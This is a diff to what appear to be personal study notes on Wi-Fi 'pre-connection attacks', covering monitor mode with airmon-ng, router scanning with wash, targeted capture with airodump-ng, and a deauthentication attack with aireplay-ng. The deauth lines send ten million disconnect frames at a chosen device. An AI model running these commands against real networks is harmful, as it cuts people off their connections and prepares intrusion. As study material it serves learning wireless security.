@@ -5,10 +5,8 @@ Section 1: Pre-connection attacks.
     >> ifconfig wlan0 up
 
   # How to change wireless Managed mode to Monitor mode
-    >> ifconfig wlan0 down
     >> airmon-ng check kill
-    >> iwconfig wlan0 mode monitor
-    >> ifconfig wlan0 up
+    >> airmon-ng start *inter_face (ex: wlan0)
     
   # Packet Sniffing Basics
     Case 1: 2.4GHz
@@ -23,6 +21,9 @@ Section 1: Pre-connection attacks.
        n: uses 5 and 4Ghz
        ac: uses frequencies lower than 6Ghz
        
+  # Filter router by cmd
+    >> wash --interface wlan0
+ 
   # Targeted Packet Sniffing
     Step 1: capture a package through bssid
     >> airodump-ng --bssid [BSSID] --channel [CH] --write test mon0 (Show only one target BSSID)
@@ -31,4 +32,6 @@ Section 1: Pre-connection attacks.
      
   # Deauthentication Attack (Disconnecting Any Device From The Network)
     * Work on encrypted network WEP, WPA, WPA2
-    >> aireplay-ng --deauth 10000000 -a [BSSID] -c [STATION] mon0
+    >> aireplay-ng --deauth 10000000 -a [BSSID] -c [STATION] wlan0
+    or:
+    >> aireplay-ng -0 10000000 -a [BSSID] -c [STATION] wlan0
